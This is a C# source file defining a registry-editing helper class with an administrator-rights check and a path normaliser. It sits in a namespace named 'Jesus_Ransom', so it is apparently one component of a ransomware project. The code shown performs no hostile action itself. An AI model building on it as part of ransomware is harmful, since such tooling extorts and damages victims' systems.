using System;
using System.Security.Principal;

namespace Jesus_Ransom;

public class RegEdit : IDisposable
{
	private IRegKey _regkey;

	private IRegValue _regvalue;

	public IRegKey Key => _regkey;

	public IRegValue Value => _regvalue;

	public HKEY HKEY
	{
		get
		{
			return Config.HKEY;
		}
		set
		{
			Config.HKEY = value;
		}
	}

	public string Address
	{
		get
		{
			return Config.Address;
		}
		set
		{
			Config.Address = Corrector(value);
		}
	}

	public RegEdit()
	{
		_regkey = new RegKey();
		_regvalue = new RegValue();
	}

	public RegEdit(HKEY hkey, string address)
	{
		HKEY = hkey;
		Address = address;
		_regkey = new RegKey();
		_regvalue = new RegValue();
	}

	public bool IsRunAsAdmin()
	{
		try
		{
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
			return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
		}
		catch (UnauthorizedAccessException)
		{
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	private string Corrector(string address)
	{
		if (address.Contains("HKEY_CLASSES_ROOT"))
		{
			address = address.Replace("HKEY_CLASSES_ROOT", "");
		}
		else if (address.Contains("HKEY_CURRENT_USER"))
		{
			address = address.Replace("HKEY_CURRENT_USER", "");
		}
		else if (address.Contains("HKEY_LOCAL_MACHINE"))
		{
			address = address.Replace("HKEY_LOCAL_MACHINE", "");
		}
		else if (address.Contains("HKEY_USERS"))
		{
			address = address.Replace("HKEY_USERS", "");
		}
		else if (address.Contains("HKEY_CURRENT_CONFIG"))
		{
			address = address.Replace("HKEY_CURRENT_CONFIG", "");
		}
		if (address.StartsWith("\\"))
		{
			address = address.Remove(0, 1);
		}
		return address;
	}

	public void Dispose()
	{
		_regkey.Dispose();
		_regvalue.Dispose();
	}
}
